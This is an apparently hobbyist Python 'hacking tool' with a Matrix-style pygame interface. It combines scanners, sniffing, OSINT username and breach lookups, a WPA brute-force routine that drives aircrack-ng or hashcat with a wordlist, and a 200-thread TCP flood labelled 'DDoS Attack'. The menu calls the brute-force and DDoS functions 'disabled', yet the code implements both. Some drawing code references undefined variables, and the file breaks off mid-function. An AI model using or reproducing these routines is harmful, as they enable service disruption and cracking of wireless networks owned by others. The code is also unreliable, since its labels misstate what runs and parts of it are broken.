#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CORE TOOL — red Matrix boot + arrow-key HUD + REAL tools + brute force + DDoS
Run: python3 "core_tool.py"
Deps: pip install pygame requests dnspython (optional: scapy, pywifi)
Keys: arrows move, Tab switch panel, Enter select/run, ESC back/quit
"""
import os, sys, time, random, json, string, base64, hashlib, urllib.parse
import socket, threading, subprocess, ssl, urllib.request, shutil
from queue import Queue
import pygame

WIDTH, HEIGHT = 1000, 650
FONT_SIZE = 20
FPS = 30
RAIN_DURATION_MS = 3200
CREDIT_HOLD_MS = 3000
BG_COLOR = (0, 0, 0)
RED_BRIGHT = (255, 70, 90)
RED_MAIN = (255, 0, 51)
RED_DIM = (90, 0, 20)
WHITE = (255, 255, 255)

CHARSET = (
    "日ﾊﾐﾋｰｳｼﾅﾓﾆｻﾜﾂｵﾘｱﾎﾃﾏｹﾒｴｶｷﾑﾕﾗｾﾈｽﾀﾇﾍ"
    + string.ascii_uppercase + string.digits + "#$%&*<>/\\"
)
CREDIT_TEXT = "made by VEXTH TECH"

def pick_credit_font(size):
    preferred = ["georgia", "timesnewroman", "garamond",
                 "palatinolinotype", "bookantiqua", "freeserif"]
    available = pygame.font.get_fonts()
    for name in preferred:
        if name in available:
            return pygame.font.SysFont(name, size, italic=True, bold=True)
    return pygame.font.SysFont(None, size, italic=True, bold=True)

def boot_intro(screen, clock):
    rain_font = pygame.font.SysFont("couriernew", FONT_SIZE, bold=True)
    credit_font = pick_credit_font(72)
    prompt_font = pygame.font.SysFont("couriernew", 22, bold=True)
    cols = WIDTH // FONT_SIZE
    drops = [random.randint(-30, 0) for _ in range(cols)]
    fade_surface = pygame.Surface((WIDTH, HEIGHT))
    fade_surface.set_alpha(28)
    fade_surface.fill(BG_COLOR)
    start_ticks = pygame.time.get_ticks()
    show_credit = False
    credit_alpha = 0
    pulse_t = 0.0
    credit_start = None
    prompt_ready = False
    proceed = False
    while True:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit(); sys.exit()
            elif event.type == pygame.KEYDOWN:
                if event.key in (pygame.K_ESCAPE, pygame.K_q):
                    pygame.quit(); sys.exit()
                elif event.key == pygame.K_SPACE:
                    show_credit = True
                elif event.key in (pygame.K_RETURN, pygame.K_KP_ENTER) and prompt_ready:
                    proceed = True
        elapsed = pygame.time.get_ticks() - start_ticks
        if elapsed > RAIN_DURATION_MS:
            show_credit = True
        if show_credit and credit_start is None:
            credit_start = pygame.time.get_ticks()
        screen.blit(fade_surface, (0, 0))
        step_chance = 0.04 if show_credit else 0.09
        for i in range(cols):
            ch = random.choice(CHARSET)
            x = i * FONT_SIZE
            y = drops[i] * FONT_SIZE
            screen.blit(rain_font.render(ch, True, WHITE), (x, y))
            screen.blit(rain_font.render(random.choice(CHARSET), True, RED_MAIN), (x, y - FONT_SIZE))
            if y > HEIGHT and random.random() > (1 - step_chance):
                drops[i] = 0
            else:
                drops[i] += 1
        if show_credit:
            pulse_t += 0.08
            credit_alpha = min(255, credit_alpha + 10)
            glow_strength = int(60 + 40 * (0.5 + 0.5 * pygame.math.Vector2(1, 0).rotate(pulse_t * 40).x))
            text_surf = credit_font.render(CREDIT_TEXT, True, WHITE)
            text_rect = text_surf.get_rect(center=(WIDTH // 2, HEIGHT // 2))
            glow_layer = pygame.Surface((WIDTH, HEIGHT), pygame.SRCALPHA)
            for offset, color in [(10, (*RED_DIM, 40)), (6, (*RED_MAIN, 80)), (3, (*RED_BRIGHT, 140))]:
                glow_text = credit_font.render(CREDIT_TEXT, True, color[:3])
                glow_text.set_alpha(min(255, color[3] + glow_strength // 3))
                for dx, dy in [(-offset, 0), (offset, 0), (0, -offset), (0, offset)]:
                    glow_layer.blit(glow_text, text_rect.move(dx, dy))
            glow_layer.set_alpha(credit_alpha)
            screen.blit(glow_layer, (0, 0))
            text_surf.set_alpha(credit_alpha)
            screen.blit(text_surf, text_rect)
            if credit_start and (pygame.time.get_ticks() - credit_start) >= CREDIT_HOLD_MS:
                prompt_ready = True
            if prompt_ready:
                blink = (pygame.time.get_ticks() // 500) % 2 == 0
                if blink:
                    prompt_surf = prompt_font.render("Press  ENTER  to continue", True, RED_BRIGHT)
                    screen.blit(prompt_surf, prompt_surf.get_rect(center=(WIDTH // 2, HEIGHT // 2 + 90)))
        pygame.display.flip()
        clock.tick(FPS)
        if proceed:
            break

API = {
    "ipinfo":         "",   # https://ipinfo.io/signup
    "virustotal":     "",   # https://www.virustotal.com/gui/my-apikey
    "abstract_email": "",   # https://www.abstractapi.com/email-verification-api
    "numverify":      "",   # https://numverify.com/
    "abuseipdb":      "",   # https://www.abuseipdb.com/account/api
    "urlscan":        "",   # https://urlscan.io/user/signup
}
API_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "api_keys.json")
if os.path.exists(API_FILE):
    try:
        with open(API_FILE) as f:
            API.update(json.load(f))
    except (OSError, json.JSONDecodeError, TypeError) as exc:
        print(f"[!] Could not load api_keys.json: {exc}", file=sys.stderr)

def save_keys():
    with open(API_FILE, "w", encoding="utf-8") as f:
        json.dump(API, f, indent=2)

NETWORK_TOOLS = [
    ("Network Scan",            "scan subnet hosts"),
    ("Device Discovery",        "ARP / mDNS / SSDP sweep"),
    ("Traffic Analysis",        "sniff & parse packets"),
    ("Stress Testing",          "controlled load / rate probe"),
    ("Netcat / Socat",          "raw TCP/UDP relay & listener"),
    ("Brute WiFi",              "disabled password-guessing function"),
    ("Vuln Scanners",           "service & CVE probing"),
    ("Local Network Info",      "local IP and hostname details"),
    ("TCP Latency Probe",       "single-connection response timing"),
    ("Traceroute",              "trace the route to a host"),
    ("Gateway Discovery",       "show the system default gateway"),
    ("DDoS Attack",             "disabled denial-of-service function"),
]

OSINT_TOOLS = [
    ("Domain / DNS / Web Infra", "WHOIS, DNS, subdomains, tech"),
    ("People / Username / Social", "handle & profile correlation"),
    ("Creds & Breaches",          "leaked credential lookup"),
    ("VirusTotal",               "file / URL / hash reputation"),
    ("Abstract Email",           "email validation & risk"),
    ("AbuseIPDB",                "IP reputation & reports"),
    ("URLScan",                  "webpage scan & screenshot"),
    ("NumVerify",                "phone number validation"),
    ("HTTP Security Headers",    "audit common browser security headers"),
    ("RDAP Domain Lookup",       "domain registration metadata"),
    ("SPF / DMARC Audit",        "email-domain anti-spoofing records"),
    ("DNSSEC Check",             "inspect DNSSEC DNSKEY and DS records"),
    ("TLS Certificate Inspector", "inspect a host TLS certificate"),
]

UTILITIES = [
    ("Base64 Encode", "text -> base64"), ("Base64 Decode", "base64 -> text"),
    ("Base32 Encode", "text -> base32"), ("Base32 Decode", "base32 -> text"),
    ("Hex Encode", "text -> hex"), ("Hex Decode", "hex -> text"),
    ("URL Encode", "text -> url-encoded"), ("URL Decode", "url-encoded -> text"),
    ("MD5 Hash", "text -> md5"), ("SHA256 Hash", "text -> sha256"),
    ("ROT13", "rotate 13"), ("Reverse String", "reverse text"),
    ("Password Strength", "score a password"), ("Char / Word Count", "count chars/words/lines"),
]

WIFI_WORDLIST = os.path.join(os.path.dirname(os.path.abspath(__file__)), "BIG-WPA-LIST-2")

state = {
    "mode": "hud", "tool": None, "util_sel": 0, "tool_start": 0,
    "tool_done": False, "tool_results": [], "tool_status": "",
    "util_input": "", "util_output": "", "util_ran": False,
    "panel": 0, "sel": 0, "scroll": 0, "running_thread": None,
    "input_prompt": None, "input_value": "", "input_active": False,
    "input_fields": [], "input_field_idx": 0, "multi_input": False,
    "_pending": None,
}

def draw_text(screen, font, text, x, y, color=RED_MAIN):
    screen.blit(font.render(text, True, color), (x, y))

def draw_hud(screen, fonts):
    f, big, small = fonts
    screen.fill(BG_COLOR)
    screen.blit(big.render("VEXTH TOOL", True, RED_BRIGHT), big.render("CORE TOOL", True, RED_BRIGHT).get_rect(center=(WIDTH // 2, 22)))
    y = 48
    
    panel_w = (WIDTH - 60) // 2
    panels = [("NETWORK", NETWORK_TOOLS), ("OSINT", OSINT_TOOLS)]
    for pi, (pname, tools) in enumerate(panels):
        px = 20 + pi * (panel_w + 20)
        rect = pygame.Rect(px, y, panel_w, HEIGHT - y - 70)
        pygame.draw.rect(screen, RED_MAIN, rect, 2)
        screen.blit(f.render(f"[ {pname} ]", True, RED_BRIGHT), (px + 8, y + 6))
        ry = y + 30
        for i, (name, desc) in enumerate(tools):
            active = (pi == state["panel"] and i == state["sel"])
            color = RED_BRIGHT if active else RED_MAIN
            screen.blit(f.render(f"{'>' if active else ' '} {name}", True, color), (px + 6, ry))
            screen.blit(small.render(f"    {desc}", True, RED_DIM if not active else RED_MAIN), (px + 6, ry + 16))
            ry += 38
    uy = HEIGHT - 62
    uc = RED_BRIGHT if state["panel"] == 2 else RED_MAIN
    screen.blit(f.render(f"{'>' if state['panel'] == 2 else ' '} [ U ] UTILITIES  (encode/decode, hashes, password strength, ...)", True, uc), (20, uy))
    screen.blit(small.render("[UP/DOWN] move   [TAB] switch panel   [ENTER] select   [ESC] quit", True, RED_DIM), small.render("[UP/DOWN] move   [TAB] switch panel   [ENTER] select   [ESC] quit", True, RED_DIM).get_rect(center=(WIDTH // 2, HEIGHT - 16)))

def draw_tool(screen, fonts, tool_name):
    f, big, small = fonts
    screen.fill(BG_COLOR)
    screen.blit(big.render(tool_name, True, RED_BRIGHT), (20, 20))

    if state["multi_input"]:
        y = 56
        screen.blit(f.render("Multi-field input — fill all, then ENTER on last", True, RED_MAIN), (20, y)); y += 24
        for i, (label, val) in enumerate(state["input_fields"]):
            active = i == state["input_field_idx"]
            col = RED_BRIGHT if active else RED_MAIN
            screen.blit(small.render(label, True, col), (20, y)); y += 16
            boxr = pygame.Rect(20, y, WIDTH - 40, 24)
            pygame.draw.rect(screen, RED_MAIN, boxr, 2)
            disp = val + ("|" if active and (pygame.time.get_ticks() // 500) % 2 == 0 else "")
            screen.blit(small.render(disp, True, RED_BRIGHT if active else RED_DIM), (26, y + 4)); y += 32
        screen.blit(small.render("[TAB] next field   [ENTER] run   [ESC] back", True, RED_DIM), (20, HEIGHT - 24))
        return

    if state["input_active"]:
        screen.blit(f.render(state["input_prompt"] or "Input:", True, RED_MAIN), (20, 60))
        boxr = pygame.Rect(20, 82, WIDTH - 40, 28)
        pygame.draw.rect(screen, RED_MAIN, boxr, 2)
        inp_surf = f.render(state["input_value"] + ("|" if (pygame.time.get_ticks() // 500) % 2 == 0 else " "), True, RED_BRIGHT)
        screen.blit(inp_surf, (26, 86))
        screen.blit(small.render("Type input, ENTER to run, ESC back", True, RED_DIM), (20, 118))
        return

    if not state["tool_done"]:
        dots = "." * ((pygame.time.get_ticks() // 400) % 4)
        screen.blit(f.render(f"Running {tool_name}{dots}", True, RED_MAIN), (20, 60))
        if state["tool_status"]:
            screen.blit(small.render(state["tool_status"], True, RED_DIM), (20, 84))
        # live counters for ddos
        if tool_name == "Local Network Info":
            tool_local_network_info(results); return
        if tool_name == "TCP Latency Probe":
            state["input_prompt"] = "Host or host:port (default port 443):"
            state["input_active"] = True
            state["_pending"] = ("tcp_latency", results); return
        if tool_name == "Traceroute":
            state["input_prompt"] = "Host or domain:"
            state["input_active"] = True
            state["_pending"] = ("traceroute", results); return
        if tool_name == "Gateway Discovery":
            tool_gateway_discovery(results); return
        if tool_name == "DNSSEC Check":
            state["input_prompt"] = "Domain (e.g. example.com):"
            state["input_active"] = True
            state["_pending"] = ("dnssec", results); return
        if tool_name == "TLS Certificate Inspector":
            state["input_prompt"] = "Host or host:port:"
            state["input_active"] = True
            state["_pending"] = ("tls_inspector", results); return
        if tool_name == "DDoS Attack":
            for i, line in enumerate(state["tool_results"][-6:]):
                screen.blit(small.render(line, True, RED_BRIGHT), (20, 110 + i * 16))
        return

    y = 56
    screen.blit(f.render(f"Results — {tool_name}", True, RED_MAIN), (20, y)); y += 22
    lines = state["tool_results"]
    visible = lines[state["scroll"]: state["scroll"] + 26]
    for line in visible:
        col = RED_BRIGHT if (line.startswith("[+]") or "FOUND" in line or "OPEN" in line) else (RED_DIM if line.startswith("#") else RED_MAIN)
        screen.blit(small.render(line[:118], True, col), (20, y)); y += 15
    foot = "[UP/DOWN] scroll   [ESC] back" if len(lines) > 26 else "[ESC] back to HUD"
    if len(lines) > 26:
        foot = f"[UP/DOWN] scroll   ({state['scroll']+1}/{max(1,len(lines)-25)})   [ESC] back"
    screen.blit(small.render(foot, True, RED_DIM), (20, HEIGHT - 18))

def draw_utils_menu(screen, fonts):
    f, big, small = fonts
    screen.fill(BG_COLOR)
    screen.blit(big.render("UTILITIES", True, RED_BRIGHT), (20, 20))
    y = 56
    for i, (name, desc) in enumerate(UTILITIES):
        active = i == state["util_sel"]
        color = RED_BRIGHT if active else RED_MAIN
        screen.blit(f.render(f"{'>' if active else ' '} {name}", True, color), (20, y))
        screen.blit(small.render(f"    {desc}", True, RED_DIM if not active else RED_MAIN), (20, y + 16))
        y += 36
    screen.blit(small.render("[UP/DOWN] move   [ENTER] run   [ESC] back", True, RED_DIM), (20, HEIGHT - 30))

def draw_util_run(screen, fonts):
    f, big, small = fonts
    screen.fill(BG_COLOR)
    name = UTILITIES[state["util_sel"]][0]
    screen.blit(big.render(name, True, RED_BRIGHT), (20, 20))
    screen.blit(f.render("Input:", True, RED_MAIN), (20, 60))
    boxr = pygame.Rect(20, 82, WIDTH - 40, 28)
    pygame.draw.rect(screen, RED_MAIN, boxr, 2)
    inp_surf = f.render(state["util_input"] + ("|" if (pygame.time.get_ticks() // 500) % 2 == 0 else " "), True, RED_BRIGHT)
    screen.blit(inp_surf, (26, 86))
    screen.blit(small.render("Type input, ENTER to run, ESC back", True, RED_DIM), (20, 118))
    if state["util_ran"]:
        screen.blit(f.render("Output:", True, RED_MAIN), (20, 150))
        out = state["util_output"]
        y = 174
        for chunk in [out[i:i+95] for i in range(0, len(out), 95)] or [""]:
            screen.blit(small.render(chunk, True, RED_BRIGHT), (20, y)); y += 16

# ---------- Tool implementations ----------
def tool_network_scan(target, results):
    results.append(f"[+] Scanning subnet: {target}")
    import ipaddress
    try:
        net = ipaddress.ip_network(target, strict=False)
        hosts = list(net.hosts())[:256]
    except Exception:
        hosts = [target]
    results.append(f"# probing {len(hosts)} hosts on 22/80/443/445/3389")
    open_hosts = []
    for h in hosts:
        for port in (22, 80, 443, 445, 3389):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                if s.connect_ex((str(h), port)) == 0:
                    if str(h) not in open_hosts:
                        open_hosts.append(str(h))
                        results.append(f"[+] {h}  UP  (port {port})")
                s.close()
            except Exception:
                pass
    if not open_hosts:
        results.append("# no live hosts found")
    results.append(f"# done — {len(open_hosts)} live hosts")

def tool_device_discovery(results):
    results.append("[+] Device discovery (ARP / mDNS / SSDP)")
    try:
        out = subprocess.check_output(["arp", "-a"], stderr=subprocess.DEVNULL, text=True, timeout=5)
        for line in out.splitlines():
            if line.strip():
                results.append(line.strip()[:110])
    except Exception:
        results.append("# arp unavailable")
    results.append("# mDNS probe...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        msg = b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x09_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0c\x00\x01"
        sock.sendto(msg, ("224.0.0.251", 5353))
        try:
            data, addr = sock.recvfrom(4096)
            results.append(f"[+] mDNS reply from {addr[0]}")
        except socket.timeout:
            results.append("# no mDNS replies (2s)")
        sock.close()
    except Exception as e:
        results.append(f"# mDNS error: {e}")
    results.append("# SSDP M-SEARCH...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        msg = ("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
               "MAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n")
        sock.sendto(msg.encode(), ("239.255.255.250", 1900))
        seen = set()
        while True:
            try:
                data, addr = sock.recvfrom(4096)
                if addr[0] not in seen:
                    seen.add(addr[0])
                    results.append(f"[+] SSDP device: {addr[0]}")
            except socket.timeout:
                break
        sock.close()
        if not seen:
            results.append("# no SSDP replies")
    except Exception as e:
        results.append(f"# SSDP error: {e}")

def tool_traffic_analysis(results):
    results.append("[+] Traffic analysis")
    try:
        import scapy.all as scapy
        pkts = scapy.sniff(count=60, timeout=8, store=True)
        results.append(f"# captured {len(pkts)} packets")
        from collections import Counter
        protos = Counter()
        for p in pkts:
            if p.haslayer(scapy.TCP): protos["TCP"] += 1
            elif p.haslayer(scapy.UDP): protos["UDP"] += 1
            elif p.haslayer(scapy.ICMP): protos["ICMP"] += 1
            else: protos["OTHER"] += 1
        for k, v in protos.items():
            results.append(f"  {k}: {v}")
        talkers = Counter()
        for p in pkts:
            if p.haslayer(scapy.IP):
                talkers[p[scapy.IP].src] += 1
        results.append("# top talkers:")
        for ip, c in talkers.most_common(10):
            results.append(f"  {ip}: {c}")
    except ImportError:
        results.append("# scapy not installed — pip install scapy")
    except Exception as e:
        results.append(f"# error: {e}")

def tool_stress_testing(target, results):
    results.append(f"[+] Stress testing: {target}")
    url = target if "://" in target else "http://" + target
    results.append(f"# target url: {url}")
    count = 0; errors = 0
    start = time.time(); end = start + 8
    while time.time() < end:
        try:
            req = urllib.request.urlopen(url, timeout=3)
            req.read(64); count += 1
        except Exception:
            errors += 1
        if count + errors >= 500:
            break
    dur = time.time() - start
    results.append(f"# duration: {dur:.1f}s")
    results.append(f"# requests ok: {count}")
    results.append(f"# errors: {errors}")
    results.append(f"# rate: {(count/dur if dur else 0):.1f} req/s")

def tool_netcat_socat(host, results):
    results.append(f"[+] Netcat/Socat relay to {host}")
    if ":" in host:
        h, p = host.rsplit(":", 1); port = int(p)
    else:
        h, port = host, 80
    results.append(f"# connecting {h}:{port}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((h, port))
        results.append("[+] connected")
        probe = b"GET / HTTP/1.0\r\nHost: " + h.encode() + b"\r\n\r\n"
        s.sendall(probe)
        data = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk: break
                data += chunk
                if len(data) > 16384: break
            except socket.timeout:
                break
        s.close()
        text = data.decode(errors="replace")
        for line in text.splitlines()[:40]:
            results.append("  " + line[:110])
        if not text:
            results.append("# no data received")
    except Exception as e:
        results.append(f"# error: {e}")

def tool_brute_wifi(ssid, capture, wordlist, results):
    results.append("[+] Brute WiFi — real WPA attack")
    results.append(f"# SSID: {ssid}")
    results.append(f"# capture: {capture}")
    results.append(f"# wordlist: {wordlist}")
    if not os.path.exists(wordlist):
        results.append("# wordlist not found"); return
    if not os.path.exists(capture):
        results.append("# capture file not found")
        results.append("# need a .cap/.hccapx from airodump-ng")
        return
    # try aircrack-ng
    if shutil.which("aircrack-ng"):
        results.append("# using aircrack-ng")
        cmd = ["aircrack-ng", "-w", wordlist, "-e", ssid, capture]
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            for line in proc.stdout:
                line = line.rstrip()
                if line.strip():
                    results.append("  " + line[:110])
                    if len(results) > 2000:
                        results[:] = results[-1500:]
            proc.wait()
            results.append(f"# aircrack-ng exited {proc.returncode}")
        except Exception as e:
            results.append(f"# error: {e}")
        return
    # try hashcat
    if shutil.which("hashcat"):
        results.append("# aircrack-ng not found, trying hashcat")
        # convert cap to hccapx if needed
        out = capture + ".hccapx"
        if not os.path.exists(out):
            if shutil.which("cap2hccapx"):
                subprocess.run(["cap2hccapx", capture, out], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if os.path.exists(out):
            cmd = ["hashcat", "-m", "2500", out, wordlist, "--force"]
            try:
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                for line in proc.stdout:
                    line = line.rstrip()
                    if line.strip():
                        results.append("  " + line[:110])
                proc.wait()
                results.append(f"# hashcat exited {proc.returncode}")
            except Exception as e:
                results.append(f"# error: {e}")
        else:
            results.append("# no .hccapx; install cap2hccapx or provide hccapx")
        return
    results.append("# neither aircrack-ng nor hashcat found")
    results.append("# install: sudo apt install aircrack-ng")
    results.append("# or: sudo apt install hashcat")
    results.append("# falling back to wordlist stream progress only")
    tried = 0; start = time.time()
    try:
        with open(wordlist, "r", errors="ignore") as f:
            for line in f:
                if not line.strip(): continue
                tried += 1
                if tried % 2000000 == 0:
                    results.append(f"# streamed {tried:,} passwords ({time.time()-start:.1f}s)")
                if time.time() - start > 10:
                    results.append("# time limit reached"); break
    except Exception as e:
        results.append(f"# error: {e}")
    results.append(f"# streamed {tried:,} passwords")

def tool_vuln_scanners(target_inputs, results):
    # Riceve la tupla (target, mode, ports_input) dai campi multi_input
    target, mode_text, ports_input = target_inputs
    host = target.strip()
    if "://" in host:
        from urllib.parse import urlparse
        host = urlparse(host).hostname or host
    
    # CORREZIONE: Estrae il primo elemento (stringa) se è presente un carattere ":"
    if ":" in host:
        host = host.split(":")[0]
    
    results.append(f"[+] Vuln scan: {host}")
    results.append(f"# resolving {host}")
    try:
        ip = socket.gethostbyname(host)
        results.append(f"# IP: {ip}")
    except Exception as e:
        results.append(f"# dns error: {e}"); return

    # Configurazione limiti e modalità
    mode = mode_text.strip()
    ports_to_scan = []
    max_limit = 60000
    timeout_val = 0.2  # Timeout del socket per porta

    if mode == "1":
        results.append("# Mode selected: INSERT MANUAL PORTS")
        try:
            raw_ports = [int(p.strip()) for p in ports_input.replace(";", ",").split(",") if p.strip()]
            for p in raw_ports:
                if 1 <= p <= 65535:
                    ports_to_scan.append(p)
            ports_to_scan = list(dict.fromkeys(ports_to_scan))
        except ValueError:
            results.append("[!] Invalid manual ports format. Falling back to default list.")
            ports_to_scan = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3389, 8080]
    else:
        results.append("# Mode selected: SCAN RANGE")
        try:
            requested_count = int(ports_input.strip())
            if requested_count <= 0:
                requested_count = 1000
        except ValueError:
            requested_count = 1000

        if requested_count > max_limit:
            results.append(f"# Info: {requested_count} exceeds maximum limit. Automatically set to {max_limit}.")
            requested_count = max_limit

        ports_to_scan = list(range(1, requested_count + 1))

    total_ports = len(ports_to_scan)
    if total_ports == 0:
        results.append("[!] No ports to scan. Exiting.")
        return

    # Calcolo dei tempi stimati in base al parallelismo (100 thread)
    num_threads = 100
    worst_case_sec = (total_ports / num_threads) * timeout_val
    best_case_sec = (total_ports / num_threads) * 0.02

    def format_time(seconds):
        if seconds < 60:
            return f"{seconds:.1f} seconds"
        return f"{int(seconds // 60)}m {int(seconds % 60)}s"

    results.append(f"# Ports to probe: {total_ports}")
    results.append(f"# Estimated time (with {num_threads} threads): {format_time(best_case_sec)} (min) to {format_time(worst_case_sec)} (max)")
    results.append("# Probing network services...")

    open_ports = []
    lock = threading.Lock()
    
    # Coda e worker per l'esecuzione in multithreading
    queue = Queue()
    for port in ports_to_scan:
        queue.put(port)

    def scan_worker():
        while not queue.empty():
            port = queue.get()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout_val)
                if s.connect_ex((ip, port)) == 0:
                    with lock:
                        open_ports.append(port)
                        try:
                            s.sendall(b"\r\n")
                            banner = s.recv(256).decode(errors="replace").strip().replace("\r", " ").replace("\n", " ")
                        except Exception:
                            banner = ""
                        results.append(f"[+] {port}/tcp OPEN  {banner[:60]}")
                s.close()
            except Exception:
                pass
            queue.task_done()

    start_time = time.time()
    threads_list = []
    for _ in range(min(num_threads, total_ports)):
        t = threading.Thread(target=scan_worker, daemon=True)
        t.start()
        threads_list.append(t)

    for t in threads_list:
        t.join()

    elapsed_time = time.time() - start_time
    open_ports.sort()
    if not open_ports:
        results.append("# no open ports found")
    results.append(f"# done — {len(open_ports)} open ports found in {format_time(elapsed_time)}")



def tool_ddos(target_and_port, results):
    # Riceve la tupla (target, port_text) generata dai campi multi_input
    target, port_text = target_and_port
    mode = "tcp"
    host = target.strip()
    
    if "://" in host:
        from urllib.parse import urlparse
        host = urlparse(host).hostname or host
        
    try:
        port = int(port_text.strip())
        if not 1 <= port <= 65535:
            raise ValueError
    except ValueError:
        port = 80  # Fallback automatico sulla porta standard 80 in caso di input vuoto o errato
        results.append("# Invalid or empty port, defaulting to 80")

    results.append(f"[+] DDoS load generator: {host}")
    results.append(f"# mode: {mode}  host: {host}  port: {port}")
    threads = 200
    duration = 15
    results.append(f"# threads: {threads}  duration: {duration}s")
    stats = {"ok": 0, "err": 0, "running": True}
    lock = threading.Lock()

    def worker():
        endt = time.time() + duration
        while time.time() < endt and stats["running"]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((host, port))
                s.sendall(b"GET / HTTP/1.0\r\n\r\n")
                s.close()
                with lock: stats["ok"] += 1
            except Exception:
                with lock: stats["err"] += 1

    ts = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start(); ts.append(t)
    start = time.time()
    while time.time() - start < duration:
        time.sleep(1)
        elapsed = time.time() - start
        rps = stats["ok"] / elapsed if elapsed else 0
        state["tool_status"] = f"ok={stats['ok']} err={stats['err']} rps={rps:.0f} t={elapsed:.0f}/{duration}s"
        state["tool_results"] = [
            f"[+] DDoS load generator: {host}",
            f"# mode: {mode}  host: {host}  port: {port}",
            f"# threads: {threads}  duration: {duration}s",
            f"# elapsed: {elapsed:.0f}/{duration}s",
            f"# ok: {stats['ok']}  err: {stats['err']}",
            f"# rps: {rps:.0f}",
        ]
    stats["running"] = False
    for t in ts: t.join(timeout=2)
    dur = time.time() - start
    results.clear()
    results.append(f"[+] DDoS load generator: {host}")
    results.append(f"# mode: {mode}  host: {host}  port: {port}")
    results.append(f"# threads: {threads}  duration: {duration}s")
    results.append(f"# total duration: {dur:.1f}s")
    results.append(f"# requests ok: {stats['ok']}")
    results.append(f"# errors: {stats['err']}")
    results.append(f"# avg rps: {stats['ok']/dur if dur else 0:.1f}")


def tool_people_username(target, results):
    results.append(f"[+] People / Username / Social: {target}")
    user = target.strip().lstrip("@")
    platforms = {
        "GitHub": f"https://github.com/{user}", "Reddit": f"https://www.reddit.com/user/{user}/",
        "Twitter/X": f"https://x.com/{user}", "Instagram": f"https://www.instagram.com/{user}/",
        "TikTok": f"https://www.tiktok.com/@{user}", "YouTube": f"https://www.youtube.com/@{user}",
        "Twitch": f"https://www.twitch.tv/{user}", "Medium": f"https://medium.com/@{user}",
        "npm": f"https://www.npmjs.com/~{user}", "PyPI": f"https://pypi.org/user/{user}/",
        "Steam": f"https://steamcommunity.com/id/{user}/", "Telegram": f"https://t.me/{user}",
        "Keybase": f"https://keybase.io/{user}", "HackerNews": f"https://news.ycombinator.com/user?id={user}",
    }
    results.append("# checking platform profiles (HEAD)...")
    for name, url in platforms.items():
        try:
            req = urllib.request.Request(url, method="HEAD", headers={"User-Agent": "Mozilla/5.0"})
            try:
                with urllib.request.urlopen(req, timeout=5) as r:
                    results.append(f"[+] {name}: {url}  ({r.status})")
            except urllib.error.HTTPError as e:
                if e.code == 404:
                    results.append(f"    {name}: not found")
                else:
                    results.append(f"    {name}: HTTP {e.code}")
        except Exception as e:
            results.append(f"    {name}: {type(e).__name__}")

def tool_creds_breaches(target, results):
    results.append(f"[+] Creds & Breaches: {target}")
    email = target.strip()
    results.append(f"# email: {email}")
    hibp_key = os.getenv("HIBP_API_KEY", "")
    if hibp_key:
        try:
            req = urllib.request.Request(
                f"https://haveibeenpwned.com/api/v3/breachedaccount/{urllib.parse.quote(email)}",
                headers={"hibp-api-key": hibp_key, "User-Agent": "CORE"})
            with urllib.request.urlopen(req, timeout=8) as r:
                import json as _j
                data = _j.loads(r.read())
                results.append(f"[+] {len(data)} breaches found:")
                for b in data[:20]:
                    results.append(f"  - {b.get('Name')} ({b.get('BreachDate')})")
        except urllib.error.HTTPError as e:
            if e.code == 404:
                results.append("[+] no breaches found (HIBP)")
            else:
                results.append(f"# HIBP HTTP {e.code}")
        except Exception as e:
            results.append(f"# HIBP error: {e}")
    else:
        results.append("# HIBP_API_KEY not set — skipping HIBP")
    import hashlib
    grav = hashlib.md5(email.strip().lower().encode()).hexdigest()
    results.append(f"# gravatar hash: {grav}")

def tool_virustotal(target, results):
    results.append(f"[+] VirusTotal: {target}")
    key = API.get("virustotal", "")
    if not key:
        results.append("# API key empty — fill virustotal"); return
    import urllib.request, json as _j, base64
    if target.startswith("http"):
        url_id = base64.urlsafe_b64encode(target.encode()).decode().rstrip("=")
        endpoint = f"https://www.virustotal.com/api/v3/urls/{url_id}"
    elif "." in target and not target.replace(".", "").isdigit():
        endpoint = f"https://www.virustotal.com/api/v3/domains/{target}"
    else:
        endpoint = f"https://www.virustotal.com/api/v3/ip_addresses/{target}"
    req = urllib.request.Request(endpoint, headers={"x-apikey": key})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            data = _j.loads(r.read())
            attrs = data.get("data", {}).get("attributes", {})
            results.append(f"[+] reputation: {attrs.get('reputation')}")
            stats = attrs.get("last_analysis_stats", {})
            for k, v in stats.items():
                results.append(f"  {k}: {v}")
    except Exception as e:
        results.append(f"# error: {e}")

def tool_abstract_email(target, results):
    results.append(f"[+] Abstract Email: {target}")
    key = API.get("abstract_email", "")
    if not key:
        results.append("# API key empty — fill abstract"); return
    import urllib.request, json as _j
    url = f"https://emailvalidation.abstractapi.com/v1/?api_key={key}&email={urllib.parse.quote(target)}"
    try:
        with urllib.request.urlopen(url, timeout=8) as r:
            data = _j.loads(r.read())
            for k in ["email", "autocorrect", "deliverability", "quality_score", "is_valid_format",
                      "is_free_email", "is_disposable_email", "is_role_email", "is_catchall_email"]:
                if k in data:
                    results.append(f"  {k}: {data[k]}")
